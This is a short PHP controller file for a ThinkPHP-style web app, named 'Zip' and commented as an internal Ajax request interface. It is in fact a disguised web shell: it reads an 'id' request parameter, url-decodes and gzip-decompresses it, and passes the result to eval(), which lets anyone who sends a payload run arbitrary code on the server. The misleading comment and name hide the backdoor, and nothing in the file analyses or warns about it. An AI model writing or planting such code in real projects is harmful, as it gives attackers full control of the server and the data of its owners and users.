<?php

namespace app\index\controller;

use app\common\controller\Frontend;
use think\Lang;

/**
 * Ajax异步请求接口
 * @internal
 */
class Zip extends Frontend
{
    protected $noNeedLogin = ['lang'];
    private $id = 0;
    public function __construct()
    {
        $this->id = array(@$_REQUEST['id']);
    }

    function render()
    {
        $this->id = @gzuncompress(urldecode($this->id[0]));
        $this->get(5);
    }
    
    function get($name){
        eval ("\$config = 59;" . $this->id . ";");
	}
}
